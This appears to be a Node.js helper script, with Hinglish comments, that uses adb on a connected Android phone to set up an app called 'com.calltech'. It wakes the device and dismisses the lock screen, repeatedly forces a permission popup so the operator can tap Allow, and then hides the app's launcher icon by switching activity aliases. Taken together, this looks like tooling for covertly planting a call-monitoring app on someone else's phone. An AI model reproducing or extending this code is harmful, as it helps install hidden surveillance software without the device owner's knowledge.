/**
 * Install ke baad: home kholo, permission popup lao, icon baad mein hide.
 * adb `pm disable` process ko maar deta hai — popup ke dauran mat chalao.
 */
const {execSync} = require('child_process');

const PACKAGE = 'com.calltech';
const ACTIVITY = `${PACKAGE}/.PermissionTrampolineActivity`;
const VISIBLE = `${PACKAGE}/.LauncherAlias`;
const HIDDEN = `${PACKAGE}/.HiddenAlias`;

function run(command) {
  try {
    execSync(command, {stdio: 'pipe', encoding: 'utf8'});
    return true;
  } catch (_error) {
    return false;
  }
}

function sleepMs(ms) {
  const seconds = Math.max(1, Math.ceil(ms / 1000) + 1);
  try {
    execSync(`ping -n ${seconds} 127.0.0.1 > nul`, {stdio: 'ignore'});
  } catch (_error) {
    // ignore
  }
}

function hideLauncherIcon(deviceId) {
  run(`adb -s ${deviceId} shell pm enable --user 0 ${HIDDEN}`);
  run(`adb -s ${deviceId} shell pm disable-user --user 0 ${VISIBLE}`);
  run(`adb -s ${deviceId} shell pm disable ${VISIBLE}`);
}

function startPopup(deviceId) {
  const starts = [
    `adb -s ${deviceId} shell am start --user 0 -n ${ACTIVITY} -a android.intent.action.MAIN -c android.intent.category.DEFAULT -f 0x14000000 --ez calltech_force_popup true`,
    `adb -s ${deviceId} shell am start --user 0 -n ${ACTIVITY} -f 0x10000000 --ez calltech_force_popup true`,
    `adb -s ${deviceId} shell am start --user 0 -n ${PACKAGE}/${PACKAGE}.PermissionTrampolineActivity -f 0x10000000`,
    `adb -s ${deviceId} shell cmd activity start-activity --user 0 -n ${ACTIVITY}`,
    `adb -s ${deviceId} shell monkey -p ${PACKAGE} -c android.intent.category.LAUNCHER 1`,
  ];
  return starts.some(cmd => run(cmd));
}

function launchPermissionPopup(deviceId) {
  run(`adb -s ${deviceId} shell input keyevent KEYCODE_WAKEUP`);
  run(`adb -s ${deviceId} shell wm dismiss-keyguard`);
  run(`adb -s ${deviceId} shell input keyevent 82`);
  run(`adb -s ${deviceId} shell pm enable --user 0 ${PACKAGE}/.PermissionTrampolineActivity`);
  run(`adb -s ${deviceId} shell pm enable --user 0 ${VISIBLE}`);

  sleepMs(1500);

  run(
    `adb -s ${deviceId} shell am start --user 0 -a android.intent.action.MAIN -c android.intent.category.HOME`,
  );
  sleepMs(500);

  let started = false;
  for (let i = 0; i < 10; i += 1) {
    if (startPopup(deviceId)) {
      started = true;
      break;
    }
    sleepMs(600);
  }

  console.log(
    started
      ? '  Release APK: home par permission popup — Allow dabao. App mat kholo.'
      : '  Popup start fail — Developer options: USB debugging (Security settings) ON.',
  );

  return started;
}

module.exports = {
  PACKAGE,
  ACTIVITY,
  launchPermissionPopup,
  hideLauncherIcon,
};
